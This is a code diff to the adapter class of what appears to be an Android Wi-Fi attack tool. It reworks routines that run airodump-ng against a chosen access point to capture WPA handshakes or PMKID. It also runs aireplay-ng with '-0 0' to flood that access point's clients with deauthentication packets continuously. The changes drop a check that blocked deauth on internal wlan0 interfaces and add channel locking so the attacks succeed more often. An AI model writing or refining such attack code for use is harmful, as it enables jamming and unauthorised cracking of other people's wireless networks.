@@ -581,8 +581,6 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
         }
         else if (type == 3){
 
-            String wlanscan = core.getHSInterface();
-            String wlandeauth = core.getDeauthInterface();
             Timer deauthtimer = new Timer();
             final boolean[] hsStatus = {false};
             final boolean[] pmkidStatus = {false};
@@ -619,20 +617,39 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
 
                 @Override
                 public void doOnBackground() {
-                    boolean deauth = true;
                     boolean monitor;
                     boolean monitor2 = true;
 
                     ArrayList<String> clients = new ArrayList<>();
-                    if (wlandeauth.contains("wlan0")){deauth = false;}
-                    sendEvent("Enabling monitor mode...");
-                    if (deauth){
-                        monitor = core.monitorManager.enableMonitorMode(wlanscan, String.valueOf(network.getChannel()));
-                        if (!wlanscan.equals(wlandeauth)){
-                            monitor2 = core.monitorManager.enableMonitorMode(wlandeauth,String.valueOf(network.getChannel()));
-                        }
-                    }else{
-                        monitor = core.monitorManager.enableMonitorMode(wlandeauth);
+                    String scanRaw = core.getString("wlan_scan");
+                    String deauthRaw = core.getString("wlan_deauth");
+                    if (deauthRaw == null) deauthRaw = "";
+                    // Internal wlan0 often lacks injection, but some phones/kernels
+                    // keep monitor on wlan0 (no wlan0mon) and can inject — try anyway.
+                    boolean likelyInternal = deauthRaw.matches("s?wlan0");
+                    int channel = network.getChannel();
+                    if (channel <= 0) {
+                        sendEvent("Invalid channel (" + channel + "). Rescan WiFi and try again.");
+                        setCanceled(true);
+                        return;
+                    }
+                    String channelStr = String.valueOf(channel);
+                    sendEvent("Enabling monitor mode on ch " + channelStr + "...");
+                    if (likelyInternal) {
+                        sendEvent("Note: deauth iface is " + deauthRaw
+                                + " (no mon rename). Injection may fail on some phones.");
+                    }
+                    monitor = core.monitorManager.enableMonitorMode(scanRaw, channelStr);
+                    if (!scanRaw.equals(deauthRaw)) {
+                        monitor2 = core.monitorManager.enableMonitorMode(deauthRaw, channelStr);
+                    }
+
+                    // Prefer live mon iface names after airmon-ng rename; stays wlan0 if no rename
+                    String hsIface = core.getHSInterface();
+                    String deauthIface = core.getDeauthInterface();
+                    core.lockWifiChannel(hsIface, channelStr);
+                    if (!hsIface.equals(deauthIface)) {
+                        core.lockWifiChannel(deauthIface, channelStr);
                     }
 
                     final boolean[] airoRunning = {false};
@@ -640,17 +657,16 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                     if (monitor && monitor2){
                         sendEvent("Starting airodump-ng...");
                         core.deleteFile(core.getStorage()+"Stryker/hs/handshake-01.cap");
-                        if (core.getHSInterface().contains("wlan0")){
-                            new Thread(() -> {
-                                core.customChrootCommand("iw dev "+core.getHSInterface()+" set channel "+network.getChannel());
-                            }).start();
-                        }
                         new Thread(() -> {
-                            String cmd = "airodump-ng " + core.getHSInterface() + " -w /sdcard/Stryker/hs/handshake  --ignore-negative-one --output-format pcap -c "+network.getChannel()+" --bssid " + network.getMac()+" --update 3";
-                            if (network.getIs5hhz()){
-                                cmd = "airodump-ng " + core.getHSInterface() + " -w /sdcard/Stryker/hs/handshake --ignore-negative-one --output-format pcap  --bssid " + network.getMac() + " --band a --update 3";
+                            // Always pin -c <channel>. 5 GHz still needs a fixed channel;
+                            // --band a alone hops and leaves aireplay on channel -1.
+                            String cmd = "airodump-ng " + hsIface
+                                    + " -w /sdcard/Stryker/hs/handshake --ignore-negative-one"
+                                    + " --output-format pcap -c " + channelStr
+                                    + " --bssid " + network.getMac() + " --update 3";
+                            if (Boolean.TRUE.equals(network.getIs5hhz())) {
+                                cmd += " --band a";
                             }
-
 
                             core.getLogger().writeLine("Starting airodump-ng... " + cmd,1);
 
@@ -697,21 +713,25 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                             };
                             airodump.setNoLog(true);
                         }).start();
-                        sendEvent("We are waiting for network to appear...");
-                        while (!airoRunning[0]){
+                        sendEvent("Waiting for target on channel " + channelStr + "...");
+                        long waitUntil = System.currentTimeMillis() + 60_000L;
+                        while (!airoRunning[0] && System.currentTimeMillis() < waitUntil && !isCanceled()){
                             try {
                                 Thread.sleep(1000);
                             } catch (InterruptedException e) {
                                 e.printStackTrace();
+                                break;
                             }
                         }
+                        if (!airoRunning[0]) {
+                            sendEvent("Timed out waiting for beacon — check adapter/channel and rescan.");
+                            setCanceled(true);
+                            return;
+                        }
                             sendEvent("Airodump-ng launched!");
-                            if (!deauth){
-                                sendEvent("Can`t deauth with (s)wlan0 interface! Passive mode!");
-                            }else{
-                            sendEvent("Starting deauth...");}
-                            if (deauth) {
-                                deauther = new AdvancedProcess(activity, context, "aireplay-ng --ignore-negative-one -0 0 -a  " + network.getMac() + " " + core.getDeauthInterface(), true) {
+                            sendEvent("Starting deauth on " + deauthIface + "...");
+                            core.lockWifiChannel(deauthIface, channelStr);
+                            deauther = new AdvancedProcess(activity, context, "aireplay-ng --ignore-negative-one -0 0 -a " + network.getMac() + " " + deauthIface, true) {
                                     @Override
                                     public void onFinished(ArrayList<String> outputList) {
 
@@ -724,14 +744,13 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                            deauthNow[0] =  "Deauth failed! Passive mode now! Error: \n"+line;
                                            if (line.contains("but")){
                                                String ch = line.split(" ")[line.split(" ").length-1];
-                                               core.customChrootCommand("iw dev "+core.getHSInterface()+" set channel "+ch);
-
-
+                                               core.lockWifiChannel(hsIface, ch);
+                                               core.lockWifiChannel(deauthIface, ch);
                                            }
-                                            if (core.getDeauthInterface().contains("wlan0")) {
-                                                deauthNow[0] = "Can`t deauth with (s)wlan0 interface! Passive mode!";
-                                            }
                                             smoothScrool(outputtext);
+                                        } else if (line.contains("channel -1") || line.contains("Waiting for beacon")) {
+                                            core.lockWifiChannel(hsIface, channelStr);
+                                            core.lockWifiChannel(deauthIface, channelStr);
                                         }
 
                                     }
@@ -741,8 +760,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
 
                                     }
                                 };
-                            }
-                            while (!hsStatus[0] && !pmkidStatus[0]){
+                            while (!hsStatus[0] && !pmkidStatus[0] && !isCanceled()){
                                     StringBuilder cls = new StringBuilder();
                                     for (String client : clients){
                                         cls.append(client).append(" ");
@@ -765,6 +783,9 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                             }
                             if (airodump != null) {
                             airodump.kill();
+                            }
+                            if (isCanceled()) {
+                                return;
                             }
                             if (hsStatus[0]) {
                                 sendEvent("Handshake captured!");
@@ -1119,14 +1140,25 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
 
         }
         else if (type == 7){
-            boolean ok = false;
-            if (!core.getDeauthInterface().equals("(s|)wlan0")){
-                ok = core.enableMonitorMode(core.getDeauthInterface(),String.valueOf(network.getChannel()));
-            }else{
-                outputtext.append("Internal wifi adapter (wlan0) does not support packet injection! Please use external wifi adapter!\n");
-            }
-            if (ok) {
-                 deauther = new AdvancedProcess(activity, context, "aireplay-ng --ignore-negative-one -0 0 -a  " + network.getMac() + " " + core.getDeauthInterface(), true) {
+            String deauthRaw = core.getString("wlan_deauth");
+            if (deauthRaw == null) deauthRaw = "";
+            int channel = network.getChannel();
+            if (channel <= 0) {
+                outputtext.append("Invalid channel (" + channel + "). Rescan WiFi and try again.\n");
+            } else {
+                String channelStr = String.valueOf(channel);
+                if (deauthRaw.matches("s?wlan0")) {
+                    outputtext.append("Using " + deauthRaw + " (monitor stays on wlan0, no *mon rename). "
+                            + "Injection depends on your kernel/driver.\n");
+                }
+                outputtext.append("Enabling monitor mode on " + deauthRaw + " ch " + channelStr + "...\n");
+                boolean ok = core.enableMonitorMode(deauthRaw, channelStr);
+                String deauthIface = core.getDeauthInterface();
+                if (ok) {
+                    core.lockWifiChannel(deauthIface, channelStr);
+                    outputtext.append("Locked " + deauthIface + " to channel " + channelStr + "\n");
+                    deauther = new AdvancedProcess(activity, context,
+                            "aireplay-ng --ignore-negative-one -0 0 -a " + network.getMac() + " " + deauthIface, true) {
                     @Override
                     public void onFinished(ArrayList<String> outputList) {
 
@@ -1144,6 +1176,9 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                         smoothScrool(outputtext);
                         if (line.contains("available")) {
                             outputtext.append("Deauth failed! Your wifi card does not support deauthing!\n");
+                        } else if (line.contains("channel -1") || line.contains("Waiting for beacon")) {
+                            // Retune once if driver dropped channel lock
+                            core.lockWifiChannel(deauthIface, channelStr);
                         }
                     }
 
@@ -1152,8 +1187,9 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
 
                     }
                 };
-            }else{
-                outputtext.append(context.getString(R.string.wifi_monitor_failed, core.getDeauthInterface()) + "\n");
+                } else {
+                    outputtext.append(context.getString(R.string.wifi_monitor_failed, deauthRaw) + "\n");
+                }
             }
         }
     }
